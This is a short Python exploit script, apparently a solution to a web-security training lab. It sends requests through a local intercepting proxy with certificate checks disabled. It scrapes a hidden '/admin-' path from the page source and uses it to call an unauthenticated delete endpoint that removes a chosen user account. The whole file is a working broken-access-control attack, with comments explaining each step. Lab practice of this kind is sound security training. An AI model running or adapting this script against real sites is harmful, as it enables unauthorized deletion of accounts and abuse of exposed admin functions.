#!/usr/bin/python3
import sys
import urllib3
import requests
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def delete_carlos(url):
    # make a request to the entry point of the app using get method using our proxy 127.0.0.1
    # ignoring verify TLS certificate errors
    get_request = requests.get(url, verify=False, proxies=proxies)
    # as the request of deleting user depends on the cookie represent by the app we need to send with the request
    # so here we capture it with this fun
    cookies = get_request.cookies.get_dict().get('session')
    # here we parse the response to lxml to extract useful information using Regx
    lxml_soup = BeautifulSoup(get_request.text, 'lxml')
    # here we need to find in the parsed text this string and because we use lxml we need to use a regex
    # so we here use re lib as reqular expresion to find this endpoint
    vulnerable_endpoint = lxml_soup.find(text=re.compile("/admin-"))
    # applying regular expression to find it from source cod of the page
    final_result = re.search("href', '(.*)'", vulnerable_endpoint).group(1)
    cookies_present = {'session': cookies}
    # here we take the username as an argument
    username = input("[*] Enter username that will be deleted. ")
    # here we parse the final url to send a request to the app
    final_url = url + final_result + "/delete?username=" + username
    delete_request = requests.get(final_url, cookies=cookies_present, verify=False, proxies=proxies)
    if delete_request.status_code == 200:
        print("[++] deleting {} done ".format(username))
    else:
        print("[-] error occur")


def exploit():
    if len(sys.argv) != 2:
        print("[-] Unexpected error occur")
        print("[*] Usage of the script is: {} <your url>".format(sys.argv[0]))
        exit(-1)
    url = sys.argv[1]
    delete_carlos(url)


if __name__ == "__main__":
    exploit()
